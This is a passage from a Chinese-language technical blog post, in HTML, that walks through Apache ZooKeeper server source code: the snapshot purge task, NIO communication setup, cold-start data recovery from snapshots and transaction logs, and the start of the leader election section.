class="comment">// 清理过期的数据</span></span><br><span class="line">            PurgeTxnLog.purge(logsDir, snapsDir, snapRetainCount);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            LOG.error(<span class="string">"Error occurred while purging."</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">            LOG.info(<span class="string">"Purge task completed."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">purge</span><span class="params">(File dataDir, File snapDir, <span class="keyword">int</span> num)</span> <span class="keyword">throws</span> IOException </span>&#123; </span><br><span class="line">    <span class="keyword">if</span> (num &lt; <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(COUNT_ERR_MSG);</span><br><span class="line">    &#125;</span><br><span class="line">    FileTxnSnapLog txnLog = <span class="keyword">new</span> FileTxnSnapLog(dataDir, snapDir); </span><br><span class="line">    List&lt;File&gt; snaps = txnLog.findNRecentSnapshots(num);</span><br><span class="line">    <span class="keyword">int</span> numSnaps = snaps.size(); </span><br><span class="line">    <span class="keyword">if</span> (numSnaps &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        purgeOlderSnapshots(txnLog, snaps.get(numSnaps - <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-5-初始化通信组件">2.5 初始化通信组件</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (args.length == <span class="number">1</span> &amp;&amp; config.isDistributed()) &#123;</span><br><span class="line">    runFromConfig(config);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    LOG.warn(<span class="string">"Either no config or no quorum defined in config, running "</span></span><br><span class="line">            + <span class="string">" in standalone mode"</span>);</span><br><span class="line">    <span class="comment">// there is only server in the quorum -- run as standalone</span></span><br><span class="line">    ZooKeeperServerMain.main(args);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通信协议默认 NIO</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">runFromConfig</span><span class="params">(QuorumPeerConfig config)</span><span class="keyword">throws</span> IOException, AdminServerException</span>&#123;</span><br><span class="line">......</span><br><span class="line">LOG.info(<span class="string">"Starting quorum peer"</span>);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    ServerCnxnFactory cnxnFactory = <span class="keyword">null</span>;</span><br><span class="line">    ServerCnxnFactory secureCnxnFactory = <span class="keyword">null</span>;</span><br><span class="line">    <span class="comment">// 通信组件初始化，默认是 NIO 通信</span></span><br><span class="line">    <span class="keyword">if</span> (config.getClientPortAddress() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// zookeeperAdmin.md 文件中</span></span><br><span class="line">        <span class="comment">//Default is `NIOServerCnxnFactory</span></span><br><span class="line">        cnxnFactory = ServerCnxnFactory.createFactory();</span><br><span class="line">        cnxnFactory.configure(config.getClientPortAddress(),</span><br><span class="line">        config.getMaxClientCnxns(), <span class="keyword">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (config.getSecureClientPortAddress() != <span class="keyword">null</span>) &#123;</span><br><span class="line">        secureCnxnFactory = ServerCnxnFactory.createFactory();</span><br><span class="line">        secureCnxnFactory.configure(config.getSecureClientPortAddress(),</span><br><span class="line">        config.getMaxClientCnxns(), <span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 把解析的参数赋值给该 zookeeper 节点</span></span><br><span class="line">    quorumPeer = getQuorumPeer();</span><br><span class="line">    quorumPeer.setTxnFactory(<span class="keyword">new</span> FileTxnSnapLog(</span><br><span class="line">    config.getDataLogDir(),</span><br><span class="line">    config.getDataDir()));</span><br><span class="line">    quorumPeer.enableLocalSessions(config.areLocalSessionsEnabled());</span><br><span class="line">    quorumPeer.enableLocalSessionsUpgrading(</span><br><span class="line">    config.isLocalSessionsUpgradingEnabled());</span><br><span class="line">    <span class="comment">//quorumPeer.setQuorumPeers(config.getAllMembers());</span></span><br><span class="line">    quorumPeer.setElectionType(config.getElectionAlg());</span><br><span class="line">    quorumPeer.setMyid(config.getServerId());</span><br><span class="line">    quorumPeer.setTickTime(config.getTickTime());</span><br><span class="line">    quorumPeer.setMinSessionTimeout(config.getMinSessionTimeout());</span><br><span class="line">    quorumPeer.setMaxSessionTimeout(config.getMaxSessionTimeout());</span><br><span class="line">    quorumPeer.setInitLimit(config.getInitLimit());</span><br><span class="line">    quorumPeer.setSyncLimit(config.getSyncLimit());</span><br><span class="line">    quorumPeer.setConfigFileName(config.getConfigFilename());</span><br><span class="line">    <span class="comment">// 管理 zk 数据的存储</span></span><br><span class="line">    quorumPeer.setZKDatabase(<span class="keyword">new</span> ZKDatabase(quorumPeer.getTxnFactory()));</span><br><span class="line">    quorumPeer.setQuorumVerifier(config.getQuorumVerifier(), <span class="keyword">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (config.getLastSeenQuorumVerifier()!=<span class="keyword">null</span>) &#123;</span><br><span class="line">        quorumPeer.setLastSeenQuorumVerifier(config.getLastSeenQuorumVerifier(),<span class="keyword">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">   quorumPeer.initConfigInZKDatabase();</span><br><span class="line">   <span class="comment">// 管理 zk 的通信</span></span><br><span class="line">   quorumPeer.setCnxnFactory(cnxnFactory);</span><br><span class="line">   quorumPeer.setSecureCnxnFactory(secureCnxnFactory);</span><br><span class="line">   quorumPeer.setSslQuorum(config.isSslQuorum());</span><br><span class="line">   quorumPeer.setUsePortUnification(config.shouldUsePortUnification());</span><br><span class="line">   quorumPeer.setLearnerType(config.getPeerType());</span><br><span class="line">   quorumPeer.setSyncEnabled(config.getSyncEnabled());</span><br><span class="line">   quorumPeer.setQuorumListenOnAllIPs(config.getQuorumListenOnAllIPs());</span><br><span class="line">   <span class="keyword">if</span> (config.sslQuorumReloadCertFiles) &#123;</span><br><span class="line">       quorumPeer.getX509Util().enableCertFileReloading();</span><br><span class="line">   &#125;</span><br><span class="line">    ......</span><br><span class="line">    quorumPeer.setQuorumCnxnThreadsSize(config.quorumCnxnThreadsSize);</span><br><span class="line">    quorumPeer.initialize();</span><br><span class="line">    <span class="comment">// 启动 zk</span></span><br><span class="line">    quorumPeer.start();</span><br><span class="line">    quorumPeer.join();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">        <span class="comment">// warn, but generally this is ok</span></span><br><span class="line">        LOG.warn(<span class="string">"Quorum Peer interrupted"</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化 NIO 服务端 Socket（并未启动）,ctrl + alt +B 查找 configure 实现类，NIOServerCnxnFactory.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">configure</span><span class="params">(InetSocketAddress addr, <span class="keyword">int</span> maxcc, <span class="keyword">boolean</span> secure)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">// 初始化 NIO 服务端 socket，绑定 2181 端口，可以接收客户端请求</span></span><br><span class="line">    <span class="keyword">this</span>.ss = ServerSocketChannel.open();</span><br><span class="line">    ss.socket().setReuseAddress(<span class="keyword">true</span>);</span><br><span class="line">    LOG.info(<span class="string">"binding to port "</span> + addr);</span><br><span class="line">    <span class="comment">// 绑定 2181 端口</span></span><br><span class="line">    ss.socket().bind(addr);</span><br><span class="line">    ss.configureBlocking(<span class="keyword">false</span>);</span><br><span class="line">    acceptThread = <span class="keyword">new</span> AcceptThread(ss, addr, selectorThreads);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3、ZK-服务端加载数据源码解析">3、ZK 服务端加载数据源码解析</h2><p><img src="http://qnypic.shawncoding.top/blog/202402291817154.png" alt></p><p><img src="http://qnypic.shawncoding.top/blog/202402291817155.png" alt></p><h3 id="3-1-冷启动数据恢复快照数据">3.1 冷启动数据恢复快照数据</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!getView().containsKey(myid)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(<span class="string">"My id "</span> + myid + <span class="string">" not in the peer list"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 冷启动数据恢复</span></span><br><span class="line">    loadDataBase();</span><br><span class="line">    startServerCnxnFactory(); </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">// 启动通信工厂实例对象</span></span><br><span class="line">      adminServer.start();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (AdminServerException e) &#123; </span><br><span class="line">       LOG.warn(<span class="string">"Problem starting AdminServer"</span>, e); System.out.println(e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 准备选举环境</span></span><br><span class="line">    startLeaderElection();</span><br><span class="line">    <span class="comment">//  执行选举</span></span><br><span class="line">    <span class="keyword">super</span>.start();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">loadDataBase</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 加载磁盘数据到内存，恢复 DataTree</span></span><br><span class="line">        <span class="comment">// zk 的操作分两种：事务操作和非事务操作</span></span><br><span class="line">        <span class="comment">// 事务操作：zk.cteate()；都会被分配一个全局唯一的 zxid，zxid 组成：64 位：（前 32 位：epoch 每个 leader 任期的代号；后 32 位：txid 为事务 id）</span></span><br><span class="line">        <span class="comment">// 非事务操作：zk.getData()</span></span><br><span class="line">        zkDb.loadDataBase();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// load the epochs</span></span><br><span class="line">        <span class="keyword">long</span> lastProcessedZxid = zkDb.getDataTree().lastProcessedZxid;</span><br><span class="line">        <span class="keyword">long</span> epochOfZxid = ZxidUtils.getEpochFromZxid(lastProcessedZxid);</span><br><span class="line">        ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">restore</span><span class="params">(DataTree dt, Map&lt;Long, Integer&gt; sessions,PlayBackListener listener)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// 恢复快照文件数据到 DataTree</span></span><br><span class="line">    <span class="keyword">long</span> deserializeResult = snapLog.deserialize(dt, sessions);</span><br><span class="line">    FileTxnLog txnLog = <span class="keyword">new</span> FileTxnLog(dataDir);</span><br><span class="line">    RestoreFinalizer finalizer = () -&gt; &#123;</span><br><span class="line">    <span class="comment">// 恢复编辑日志数据到 DataTree</span></span><br><span class="line">    <span class="keyword">long</span> highestZxid = fastForwardFromEdits(dt, sessions, listener);</span><br><span class="line">    <span class="keyword">return</span> highestZxid;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ctrl + alt +B 查找 deserialize 实现类 FileSnap.java</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">deserialize</span><span class="params">(DataTree dt, Map&lt;Long, Integer&gt; sessions)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">// 依次遍历每一个快照的数据</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>, snapListSize = snapList.size(); i &lt; snapListSize; i++) &#123;</span><br><span class="line">        snap = snapList.get(i);</span><br><span class="line">        LOG.info(<span class="string">"Reading snapshot "</span> + snap);</span><br><span class="line">        <span class="comment">// 反序列化环境准备</span></span><br><span class="line">        <span class="keyword">try</span> (InputStream snapIS = <span class="keyword">new</span> BufferedInputStream(<span class="keyword">new</span> FileInputStream(snap));</span><br><span class="line">             CheckedInputStream crcIn = <span class="keyword">new</span> CheckedInputStream(snapIS, <span class="keyword">new</span> Adler32())) &#123;</span><br><span class="line">            InputArchive ia = BinaryInputArchive.getArchive(crcIn);</span><br><span class="line">            <span class="comment">// 反序列化，恢复数据到 DataTree</span></span><br><span class="line">            deserialize(dt, sessions, ia);</span><br><span class="line">     ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deserialize</span><span class="params">(DataTree dt, Map&lt;Long, Integer&gt; sessions,</span></span></span><br><span class="line"><span class="function"><span class="params">        InputArchive ia)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    FileHeader header = <span class="keyword">new</span> FileHeader();</span><br><span class="line">    header.deserialize(ia, <span class="string">"fileheader"</span>);</span><br><span class="line">    <span class="keyword">if</span> (header.getMagic() != SNAP_MAGIC) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"mismatching magic headers "</span></span><br><span class="line">                + header.getMagic() +</span><br><span class="line">                <span class="string">" !=  "</span> + FileSnap.SNAP_MAGIC);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 恢复快照数据到 DataTree</span></span><br><span class="line">    SerializeUtils.deserializeSnapshot(dt,ia,sessions);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">deserializeSnapshot</span><span class="params">(DataTree dt,InputArchive ia,</span></span></span><br><span class="line"><span class="function"><span class="params">        Map&lt;Long, Integer&gt; sessions)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> count = ia.readInt(<span class="string">"count"</span>);</span><br><span class="line">    <span class="keyword">while</span> (count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">long</span> id = ia.readLong(<span class="string">"id"</span>);</span><br><span class="line">        <span class="keyword">int</span> to = ia.readInt(<span class="string">"timeout"</span>);</span><br><span class="line">        sessions.put(id, to);</span><br><span class="line">        <span class="keyword">if</span> (LOG.isTraceEnabled()) &#123;</span><br><span class="line">            ZooTrace.logTraceMessage(LOG, ZooTrace.SESSION_TRACE_MASK,</span><br><span class="line">                    <span class="string">"loadData --- session in archive: "</span> + id</span><br><span class="line">                    + <span class="string">" with timeout: "</span> + to);</span><br><span class="line">        &#125;</span><br><span class="line">        count--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 恢复快照数据到 DataTree</span></span><br><span class="line">    dt.deserialize(ia, <span class="string">"tree"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deserialize</span><span class="params">(InputArchive ia, String tag)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    aclCache.deserialize(ia);</span><br><span class="line">    nodes.clear();</span><br><span class="line">    pTrie.clear();</span><br><span class="line">    String path = ia.readString(<span class="string">"path"</span>);</span><br><span class="line">    <span class="comment">// 从快照中恢复每一个 datanode 节点数据到 DataTree</span></span><br><span class="line">    <span class="keyword">while</span> (!<span class="string">"/"</span>.equals(path)) &#123;</span><br><span class="line">        <span class="comment">// 每次循环创建一个节点对象  </span></span><br><span class="line">        DataNode node = <span class="keyword">new</span> DataNode();</span><br><span class="line">        ia.readRecord(node, <span class="string">"node"</span>);</span><br><span class="line">        <span class="comment">// 将 DataNode 恢复到 DataTree</span></span><br><span class="line">        nodes.put(path, node);</span><br><span class="line">        <span class="keyword">synchronized</span> (node) &#123;</span><br><span class="line">            aclCache.addUsage(node.acl);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> lastSlash = path.lastIndexOf(<span class="string">'/'</span>);</span><br><span class="line">        <span class="keyword">if</span> (lastSlash == -<span class="number">1</span>) &#123;</span><br><span class="line">            root = node;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 处理父节点</span></span><br><span class="line">            String parentPath = path.substring(<span class="number">0</span>, lastSlash);</span><br><span class="line">            DataNode parent = nodes.get(parentPath);</span><br><span class="line">            <span class="keyword">if</span> (parent == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"Invalid Datatree, unable to find "</span> +</span><br><span class="line">                        <span class="string">"parent "</span> + parentPath + <span class="string">" of path "</span> + path);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 处理子节点</span></span><br><span class="line">            parent.addChild(path.substring(lastSlash + <span class="number">1</span>));</span><br><span class="line">            <span class="comment">// 处理临时节点和永久节点</span></span><br><span class="line">            <span class="keyword">long</span> eowner = node.stat.getEphemeralOwner();</span><br><span class="line">            EphemeralType ephemeralType = EphemeralType.get(eowner);</span><br><span class="line">            <span class="keyword">if</span> (ephemeralType == EphemeralType.CONTAINER) &#123;</span><br><span class="line">                containers.add(path);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ephemeralType == EphemeralType.TTL) &#123;</span><br><span class="line">                ttls.add(path);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (eowner != <span class="number">0</span>) &#123;</span><br><span class="line">                HashSet&lt;String&gt; list = ephemerals.get(eowner);</span><br><span class="line">                <span class="keyword">if</span> (list == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    list = <span class="keyword">new</span> HashSet&lt;String&gt;();</span><br><span class="line">                    ephemerals.put(eowner, list);</span><br><span class="line">                &#125;</span><br><span class="line">                list.add(path);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        path = ia.readString(<span class="string">"path"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    nodes.put(<span class="string">"/"</span>, root);</span><br><span class="line">    <span class="comment">// we are done with deserializing the</span></span><br><span class="line">    <span class="comment">// the datatree</span></span><br><span class="line">    <span class="comment">// update the quotas - create path trie</span></span><br><span class="line">    <span class="comment">// and also update the stat nodes</span></span><br><span class="line">    setupQuota();</span><br><span class="line"></span><br><span class="line">    aclCache.purgeUnused();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-2-冷启动数据恢复编辑日志">3.2 冷启动数据恢复编辑日志</h3><p>回到 FileTxnSnapLog.java 类中的 restore 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">restore</span><span class="params">(DataTree dt, Map&lt;Long, Integer&gt; sessions,PlayBackListener listener)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// 恢复快照文件数据到 DataTree</span></span><br><span class="line">    <span class="keyword">long</span> deserializeResult = snapLog.deserialize(dt, sessions);</span><br><span class="line">    FileTxnLog txnLog = <span class="keyword">new</span> FileTxnLog(dataDir);</span><br><span class="line"></span><br><span class="line">    RestoreFinalizer finalizer = () -&gt; &#123;</span><br><span class="line">        <span class="comment">// 恢复编辑日志数据到 DataTree</span></span><br><span class="line">        <span class="keyword">long</span> highestZxid = fastForwardFromEdits(dt, sessions, listener);</span><br><span class="line">        <span class="keyword">return</span> highestZxid;</span><br><span class="line">    &#125;;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">fastForwardFromEdits</span><span class="params">(DataTree dt, Map&lt;Long, Integer&gt; sessions,</span></span></span><br><span class="line"><span class="function"><span class="params">                                 PlayBackListener listener)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// 在此之前，已经从快照文件中恢复了大部分数据，接下来只需从快照的 zxid + 1位置开始恢复</span></span><br><span class="line">    TxnIterator itr = txnLog.read(dt.lastProcessedZxid+<span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 快照中最大的 zxid，在执行编辑日志时，这个值会不断更新，直到所有操作执行完</span></span><br><span class="line">    <span class="keyword">long</span> highestZxid = dt.lastProcessedZxid;</span><br><span class="line">    TxnHeader hdr;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 从 lastProcessedZxid 事务编号器开始，不断的从编辑日志中恢复剩下的还没有恢复的数据</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="comment">// 获取事务头信息（有 zxid）</span></span><br><span class="line">            hdr = itr.getHeader();</span><br><span class="line">            <span class="keyword">if</span> (hdr == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="comment">//empty logs</span></span><br><span class="line">                <span class="keyword">return</span> dt.lastProcessedZxid;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (hdr.getZxid() &lt; highestZxid &amp;&amp; highestZxid != <span class="number">0</span>) &#123;</span><br><span class="line">                LOG.error(<span class="string">"&#123;&#125;(highestZxid) &gt; &#123;&#125;(next log) for type &#123;&#125;"</span>,</span><br><span class="line">                        highestZxid, hdr.getZxid(), hdr.getType());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                highestZxid = hdr.getZxid();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 根据编辑日志恢复数据到 DataTree，每执行一次，对应的事务 id，highestZxid + 1</span></span><br><span class="line">                processTransaction(hdr,dt,sessions, itr.getTxn());</span><br><span class="line">            &#125; <span class="keyword">catch</span>(KeeperException.NoNodeException e) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"Failed to process transaction type: "</span> +</span><br><span class="line">                     hdr.getType() + <span class="string">" error: "</span> + e.getMessage(), e);</span><br><span class="line">            &#125;</span><br><span class="line">            listener.onTxnLoaded(hdr, itr.getTxn());</span><br><span class="line">            <span class="keyword">if</span> (!itr.next())</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (itr != <span class="keyword">null</span>) &#123;</span><br><span class="line">            itr.close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> highestZxid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="4、ZK-选举源码解析">4、ZK 选举源码解析</h2><blockquote><p>选举流程可以参考之前的zookeeper基础学习</p></blockquote><p><img src="http://qnypic.shawncoding.top/blog/202402291817156.png" alt></p><h3 id="4-1-选举准备">4.1 选举准备</h3><p><img src="http://qnypic.shawncoding.top/blog/202402291817157.png" alt></p><figure class="highlight java"><table><tr><td 